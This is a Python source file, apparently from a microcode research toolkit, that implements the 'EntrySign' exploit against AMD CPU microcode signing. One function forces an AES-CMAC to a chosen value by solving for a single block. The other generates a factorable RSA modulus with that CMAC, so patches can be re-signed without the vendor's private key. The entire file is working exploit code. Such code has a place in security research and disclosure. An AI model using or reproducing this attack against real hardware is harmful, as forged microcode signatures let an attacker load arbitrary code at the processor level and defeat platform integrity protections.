#!/usr/bin/env python
# SPDX-License-Identifier: GPL-2.0-or-later

"""
EntrySign exploit: forge an RSA modulus that collides to a chosen AES-CMAC,
enabling patch resigning without the private key.
"""

from Crypto.Cipher import AES
from Crypto.Util.number import isPrime
from amd_ucode_patch.utils.rsa import RSA_EXPONENT_F4
from amd_ucode_patch.utils.cmac import AES_BLOCK_SIZE, cmac_digest, cmac_subkeys
from amd_ucode_patch.utils.numtheory import prime_table
from amd_ucode_patch.utils.xor import xor_bytes


def _find_cmac_preimage(
    target_cmac: bytes,
    preimage: bytearray,
    sacrifice_index: int,
    cmac_key: bytes,
) -> None:
    """
    Rewrite the 16-byte block of ``preimage`` at ``sacrifice_index`` in place so
    that ``AES-CMAC(cmac_key, preimage) == target_cmac``, leaving every other
    block untouched.

    Works by unrolling the CBC-MAC chain: the CMAC state is walked forward from
    the start up to the sacrifice block and backward from ``target_cmac`` (undoing
    the final subkey XOR) down to it, so the one unknown block is the value that
    joins the two halves. ``sacrifice_index`` must be a multiple of 16. Raises
    ``ValueError`` if the resulting CMAC does not match ``target_cmac``.
    """
    bs = AES_BLOCK_SIZE
    if sacrifice_index % bs:
        raise ValueError("sacrifice index must be a multiple of 16")

    aes = AES.new(cmac_key, AES.MODE_ECB)
    subkey1, subkey2 = cmac_subkeys(cmac_key)

    nbytes = len(preimage)
    padded_len = ((nbytes + bs - 1) // bs) * bs
    padded = bytearray(padded_len)
    padded[:nbytes] = preimage

    if nbytes % bs == 0:
        tail = padded_len - bs
        padded[tail:padded_len] = xor_bytes(padded[tail:padded_len], subkey1)
    else:
        padded[nbytes] = 0x80
        tail = padded_len - bs
        padded[tail:padded_len] = xor_bytes(padded[tail:padded_len], subkey2)

    padded[sacrifice_index:sacrifice_index + bs] = b"\x00" * bs

    out_forward = b"\x00" * bs
    for i in range(sacrifice_index // bs):
        block = bytes(padded[i * bs:(i + 1) * bs])
        out_forward = aes.encrypt(xor_bytes(out_forward, block))

    inp = bytes(target_cmac)
    for i in range((padded_len // bs) - 1, (sacrifice_index // bs) - 1, -1):
        out_backward = aes.decrypt(inp)
        block = bytes(padded[i * bs:(i + 1) * bs])
        inp = xor_bytes(out_backward, block)

    padded[sacrifice_index:sacrifice_index + bs] = xor_bytes(out_forward, inp)

    if nbytes % bs == 0:
        tail = padded_len - bs
        padded[tail:padded_len] = xor_bytes(padded[tail:padded_len], subkey1)
    else:
        tail = padded_len - bs
        padded[tail:padded_len] = xor_bytes(padded[tail:padded_len], subkey2)

    result = cmac_digest(bytes(padded[:nbytes]), cmac_key)
    if result != target_cmac:
        raise ValueError("failed to compute a matching CMAC preimage")

    preimage[sacrifice_index:sacrifice_index + bs] = padded[sacrifice_index:sacrifice_index + bs]


def produce_colliding_key(
    target_cmac: bytes,
    cmac_key: bytes,
    bits: int = 2048,
    exponent: int = RSA_EXPONENT_F4,
) -> tuple[bytes, bytes]:
    """
    Generate an RSA keypair whose modulus collides to a chosen CMAC, i.e.
    ``AES-CMAC(cmac_key, modulus) == target_cmac``. Mirrors zentool's
    factor/resign strategy used for the EntrySign exploit.

    Starting from a ``bits``-wide candidate, it repeatedly forces the CMAC to
    ``target_cmac`` (via :func:`_find_cmac_preimage`), then keeps the modulus only
    when it factors into small primes plus one large prime -- enough to compute
    the private exponent ``d`` for the public ``exponent``. Returns
    ``(modulus, private_exponent)`` as big-endian ``bits // 8``-byte strings, or
    raises ``ValueError`` if no suitable modulus is found within the attempt budget.
    """
    size = bits // 8
    key = bytearray(size)
    key[0] = 0x80
    key[-1] = 0x01

    primes = prime_table()
    for _ in range(5 * bits):
        _find_cmac_preimage(target_cmac, key, sacrifice_index=16, cmac_key=cmac_key)

        n = int.from_bytes(key, "big")
        left = n
        totient = 1
        for p in primes:
            if left % p != 0:
                continue
            first = True
            while left % p == 0:
                left //= p
                totient *= (p - 1) if first else p
                first = False

        if left > 1 and isPrime(left):
            totient *= (left - 1)
            if totient % exponent != 0:
                d = pow(exponent, -1, totient)
                return n.to_bytes(size, "big"), d.to_bytes(size, "big")

        nxt = (int.from_bytes(key, "big") + 2) % (1 << bits)
        key[:] = nxt.to_bytes(size, "big")
        key[0] |= 0x80
        key[-1] |= 0x01

    raise ValueError("failed to generate a colliding RSA modulus/private key")
